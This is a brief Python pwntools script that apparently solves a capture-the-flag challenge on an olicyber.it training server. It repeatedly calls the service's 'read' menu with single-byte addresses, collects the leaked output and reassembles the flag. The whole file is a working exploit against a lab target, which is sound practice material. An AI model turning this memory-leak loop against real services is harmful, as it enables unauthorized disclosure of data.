from pwn import *

r = remote("predatori.challs.olicyber.it", 15006)

def menu(choice: int):
    r.sendlineafter(b"3) Esci", f"{choice}".encode())

def read(where):
    menu(1)
    r.sendafter(b"Indirizzo:", where)
    r.recvuntil(b"richiesta.")
    r.recvline()
    return r.recvline().replace(b"1) LeggiCosaDove\n", b"")

flag = ""
found = False
for i in range(0, 255, 8):
    data = read(bytes([i]))
    try:
        data = data.decode()

        if "flag{" in data:
            found = True
        elif "}" in data:
            flag += data
            found = False
        
        if found:
            flag += data
    except Exception:
        pass

print(flag.strip())